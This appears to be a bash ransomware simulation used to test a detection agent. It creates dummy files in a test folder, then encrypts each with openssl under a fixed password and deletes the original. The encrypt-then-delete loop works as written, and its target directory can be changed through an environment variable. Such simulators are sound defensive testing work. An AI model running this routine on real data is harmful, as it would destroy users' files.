#!/usr/bin/env bash
set -euo pipefail

TARGET_DIR="${TARGET_DIR:-/home/arjun/Desktop/ccf-agent-nixos/ransomware_test/variant6}"
NUM_DIRS="${NUM_DIRS:-10}"
FILES_PER_DIR="${FILES_PER_DIR:-20}"

echo "=== Ransomware Simulation: Directory Spread ==="
echo "Target: $TARGET_DIR"
echo "Encrypts files spread across multiple directories"

mkdir -p "$TARGET_DIR"

for d in $(seq 1 $NUM_DIRS); do
    dir="$TARGET_DIR/folder_$d"
    mkdir -p "$dir"
    for i in $(seq 1 $FILES_PER_DIR); do
        echo "File $i in folder $d" > "$dir/file_$i.txt"
    done
done
total=$((NUM_DIRS * FILES_PER_DIR))
echo "Created $total files across $NUM_DIRS directories"

echo "Phase 1: Scanning directory structure..."
find "$TARGET_DIR" -type f > /tmp/file_list.txt
wc -l < /tmp/file_list.txt

echo "Phase 2: Cross-directory encryption..."
while IFS= read -r file; do
    if [ -f "$file" ]; then
        openssl enc -aes-256-cbc -salt -in "$file" -out "${file}.crypt" -pass pass:spread 2>/dev/null
        rm "$file"
        echo "Encrypted $(basename $(dirname $file))/$(basename $file)"
        sleep 0.03
    fi
done < /tmp/file_list.txt

rm -f /tmp/file_list.txt
echo "=== Simulation complete ==="
